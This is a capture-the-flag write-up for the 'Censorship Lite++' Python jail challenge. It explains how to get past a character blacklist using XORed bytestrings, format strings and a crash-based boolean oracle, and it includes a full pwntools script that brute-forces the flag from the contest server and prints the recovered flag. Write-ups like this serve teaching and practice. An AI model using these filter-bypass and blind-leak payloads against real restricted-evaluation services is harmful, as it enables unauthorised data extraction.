# Censorship Lite++

## Intoduction

In this Pyjail Challenge we had to leak a variable flag which was stored in the variable `_`.

And we couldn't use any non ascii chars nor any characters found in `lite0123456789 :< :( ): :{ }: :*\ ,-.`

## Creating Booleans
This step is quite straight forward. By using strings and equal signs we can use `'a'=='a'` for `True` and `'a'=='b'` for `False`.

## Creating Numbers
Zero and one can be created by using the booleans as values. `False` represents 0 and `True` represents 1. It would be technically possible to create any number by just adding many `True`'s together. Eg `True+True+True+True => 4`

Luckly we were still allowed to use quotes which reduced the payload by quite a lot by allowing us to create bytestrings. And by accessing the indecies of the bytestring we can get much higher numbers `b"a"[False] => 97`. 

Combining those to features we can create any number (it uses a bit of bruteforce...):

```py
def create_num_v2(x):
    if x < 60:
        while True:
            a = random.choice(string.ascii_letters)
            b = random.choice(string.ascii_letters)
            if any([i in (a+b) for i in list("lite0123456789 :< :( ): :{ }: :*\ ,-.")]):
                continue

            if ord(a[0]) ^ ord(b[0]) != x:
                continue

            return f"[b'{a}'['a'=='b']^b'{b}'['a'=='b']]['a'=='b']"
    else:
        return f"{create_num_v2(50)}+{create_num_v2(x - 50)}"
```

## Creating Strings
For creating any string we can abuse the format string operator `"%c" % 65 => 'A'`

## Make If Statements
Because we can't access any functions we need to crash the application to differentiate.
This can be done by abusing the optimizations of python:
```py
b = 1==1 or exit()
print(b)
```
will output `True`
while 
```py
b = 1==9 or exit()
print(b)
```
won't output anything. Because Python knows that `True or ...` will always be True it ignores what follows.

and heres the function to crash it `or[b'a'^b'a']`

## Putting Everything Together

```py
from pwn import *
import string


def create_num_v2(x):
    if x < 60:
        while True:
            a = random.choice(string.ascii_letters)
            b = random.choice(string.ascii_letters)
            if any([i in (a+b) for i in list("lite0123456789 :< :( ): :{ }: :*\ ,-.")]):
                continue

            if ord(a[0]) ^ ord(b[0]) != x:
                continue

            return f"[b'{a}'['a'=='b']^b'{b}'['a'=='b']]['a'=='b']"
    else:
        return f"{create_num_v2(50)}+{create_num_v2(x - 50)}"



r = remote("amt.rs", 31672)


known = "amateursCTF{le_elite_little_tiles_let_le_light_light_le_flag_til_the_light_tiled_le_elitist_level}"
r.recvuntil("code:")
for a in range(len(known), 99):
    for c in string.printable:
        payload = f"b=_[{create_num_v2(a)}]=='%c'%[{create_num_v2(ord(c))}]['a'=='b']or[b'a'^b'a']"
        r.sendline(payload)
        #print(c, payload)
        res = r.recvuntil("code:")
        #print(res)
        if b"zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz" not in res:
            known += c
            print(known)
            break

```
